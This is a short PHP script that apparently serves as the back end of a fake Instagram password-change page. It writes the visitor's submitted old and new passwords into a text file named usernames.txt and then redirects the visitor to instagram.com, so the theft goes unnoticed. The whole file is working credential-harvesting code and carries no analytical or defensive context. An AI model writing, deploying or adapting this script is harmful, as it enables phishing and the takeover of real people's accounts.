<?php

file_put_contents("usernames.txt", "Account: " . $_POST['old_password'] . " Pass: " . $_POST['new_password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
